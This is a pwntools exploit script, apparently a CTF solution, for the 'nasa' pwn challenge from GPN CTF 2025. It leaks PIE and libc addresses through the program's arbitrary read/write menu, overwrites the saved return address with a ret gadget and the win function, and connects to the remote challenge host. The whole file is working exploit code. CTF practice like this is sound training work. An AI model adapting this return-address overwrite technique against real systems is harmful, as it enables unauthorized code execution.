#!/usr/bin/env python3
import sys

from pwn import *

BINARY_PATH = "/ctf-writeups/2025/gpn-ctf/pwn/nasa/dist/nasa"
LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"
REMOTE_HOST = "portview-of-dominating-hope.gpn23.ctf.kitctf.de"
REMOTE_PORT = 443

context.binary = BINARY_PATH
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h", "-p 65"]

elf = context.binary
libc = ELF(LIBC_PATH)
ret_gadget = next(elf.search(asm("ret")))

is_remote = len(sys.argv) == 2 and sys.argv[1] == "remote"


def attach(r):
    if is_remote:
        return

    bkps = []
    gdb.attach(r, "\n".join(f"break {x}" for x in bkps))


def write(r, addr, val):
    r.sendlineafter(b"Exit\n", b"1")
    r.sendlineafter(b"(hex)\n", f"{hex(addr)} {hex(val)}".encode())


def read(r, addr):
    r.sendlineafter(b"Exit\n", b"2")
    r.sendlineafter(b"(hex)\n", f"{hex(addr)}".encode())
    return int(r.recvline().strip().decode(), 16)


def exit(r):
    r.sendlineafter(b"Exit\n", b"3")


def exploit(r):
    attach(r)

    r.recvline()
    win_addr = int(r.recvline().strip().decode(), 16)
    elf.address = win_addr - elf.sym.win

    stdin_addr = read(r, elf.sym.stdin)
    libc.address = stdin_addr - libc.sym._IO_2_1_stdin_

    environ_addr = read(r, libc.sym.environ)
    ret_addr = environ_addr - 0x130

    write(r, ret_addr, ret_gadget)
    write(r, ret_addr + 8, win_addr)
    exit(r)
    r.interactive()


def main():
    if is_remote:
        r = remote(REMOTE_HOST, REMOTE_PORT, ssl=True)
    else:
        r = process(elf.path)

    exploit(r)

if __name__ == "__main__":
    main()
